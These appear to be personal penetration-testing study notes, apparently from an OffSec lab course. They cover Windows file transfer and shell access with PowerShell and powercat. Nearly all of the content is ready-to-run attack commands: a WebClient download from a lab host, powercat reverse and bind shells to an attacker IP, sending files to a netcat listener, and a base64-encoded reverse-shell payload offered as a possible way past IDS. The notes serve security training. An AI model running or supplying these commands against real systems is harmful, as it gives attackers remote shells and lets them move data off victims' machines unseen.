### Transfer Files
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

### Reverse Shell
![[Pasted image 20220830193023.png]]
Resource:
https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

### Bind Shell
![[Pasted image 20220830194523.png]]
Resource
https://gitbook.brainyou.stream/reverse-shells

### Powercat
It is a script we can download to a Windows host to leverage the strengths of PowerShell and simplifies the creation of bind/reverse shells

The script is under /usr/share/windows-resources/powercat.
Initialize the script (once uploaded)
```powershell
PS C:\Users\Offsec> . .\powercat.ps1
```
Once uploaded
We can execute powercat as follows:
```
PS C:\Users\offsec> powercat
You must select either client mode (-c) or listen mode (-l).
```

### Reverse shell:
```powershell
powercat -c <attacker_ip> -p <port> -e cmd.exe
```

### Bind shell:
```powershell
powercat -l -p 443 -e cmd.exe
```

### File Transfer:
By first opening a port with netcat:
```bash
sudo nc -lnvp 443 > receiving_powercat.ps1
```
Then with -i flag choose the file path:
```powershell
powercat -c <attacker_ip> -p <port> -e cmd.exe -i C\Windows\Privesc\revershell.ps1
```

### Stand-Alone Payload
You can redirect the output of powercat, then save it into a file and execute such file as a powershell script with the -g flag:
```powershell
powercat -c <attacker_ip> -p <port) -e cmd.exe -g > revershell.ps1
```

### Encoded version (could ... but unlikely, evade IDS):
First create the file with -ge flag:
```powershell
powercat -c <attacker_ip> -p <port> -e cmd.exe -ge > revershell.ps1
```
In order to run the payload run the -E flag:
```powershell
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA
```



